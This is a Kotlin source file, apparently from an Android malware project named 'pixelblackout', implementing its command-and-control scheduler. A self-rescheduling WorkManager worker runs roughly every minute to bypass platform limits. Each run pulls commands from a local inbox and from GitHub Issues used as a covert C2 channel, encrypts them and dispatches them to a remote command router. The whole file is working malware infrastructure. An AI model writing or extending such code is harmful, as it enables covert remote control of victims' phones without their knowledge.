package com.example.pixelblackout.c2

import android.content.Context
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.ExistingWorkPolicy
import java.io.File
import android.util.Log
import java.util.concurrent.TimeUnit
import org.json.JSONObject

object C2Scheduler {
    private const val PERIODIC_WORK_NAME = "pixelblackout-c2"
    private const val ONE_SHOT_WORK_NAME = "pixelblackout-c2-once"
    private const val LOOP_WORK_NAME = "pixelblackout-c2-loop"

    fun schedule(context: Context) {
        // Use a self-rescheduling one-shot worker to approximate a ~1-minute interval.
        // WorkManager's PeriodicWork minimum is 15 minutes, so we manually chain.
        enqueueOnce(context, delayMinutes = 0)
    }

    fun enqueueOnce(context: Context, delayMinutes: Long) {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()
        val request = OneTimeWorkRequestBuilder<C2Worker>()
            .setConstraints(constraints)
            .setInitialDelay(delayMinutes, TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(context).enqueueUniqueWork(
            LOOP_WORK_NAME,
            ExistingWorkPolicy.REPLACE,
            request
        )
    }

    class C2Worker(
        context: Context,
        params: WorkerParameters
    ) : CoroutineWorker(context, params) {

        override suspend fun doWork(): Result {
            if (com.example.pixelblackout.BuildConfig.DEBUG) Log.d("C2Worker", "doWork begin")
            // Ensure key material is available (will no-op if already configured)
            runCatching { com.example.pixelblackout.nativebridge.NativeCrypto.warmUp() }
            val inbox = File(applicationContext.filesDir, "c2/inbox")
            val files = if (inbox.exists() && inbox.isDirectory) {
                inbox.listFiles()?.sortedBy { it.name }
            } else {
                emptyList()
            }

            files?.forEach { file ->
                runCatching {
                    val payload = file.readText(Charsets.UTF_8).trim()
                    if (payload.isNotEmpty()) {
                if (com.example.pixelblackout.BuildConfig.DEBUG) Log.d("C2Worker", "dispatching local inbox payload len=${payload.length}")
                        RemoteCommandRouter.dispatch(payload)
                    }
                }
                file.delete()
            }

            // GitHub Issues based C2 (read-only)
            runCatching {
                if (com.example.pixelblackout.BuildConfig.DEBUG) Log.d("C2Worker", "polling GitHub issues…")
                val issueJobs = GitHubIssueC2Client.fetchJobs(applicationContext)
                if (com.example.pixelblackout.BuildConfig.DEBUG) Log.d("C2Worker", "received ${issueJobs.size} job(s) from issues")
                val latest = issueJobs.maxByOrNull { it.id.toLongOrNull() ?: Long.MIN_VALUE }
                if (latest != null) {
                    if (com.example.pixelblackout.BuildConfig.DEBUG) Log.d("C2Worker", "dispatching latest job id=${latest.id} directPayload=${latest.payload?.length ?: 0}")
                    dispatchJob(latest)
                } else {
                    if (com.example.pixelblackout.BuildConfig.DEBUG) Log.d("C2Worker", "no matching jobs to dispatch in this cycle")
                }
            }

            // Re-enqueue next run ~3 minutes later
            enqueueOnce(applicationContext, delayMinutes = 1)
            return Result.success()
        }

        private fun dispatchJob(job: C2Job) {
            val direct = job.payload
            if (!direct.isNullOrBlank()) {
                RemoteCommandRouter.dispatch(direct)
                return
            }
            val command = job.cmd ?: return
            val json = JSONObject().apply {
                put("cmd", command)
                job.arg?.let { put("arg", it) }
            }
            val encrypted = C2Cipher.encrypt(json.toString())
            if (encrypted.isNotEmpty()) {
                RemoteCommandRouter.dispatch(encrypted)
            }
        }
    }

}
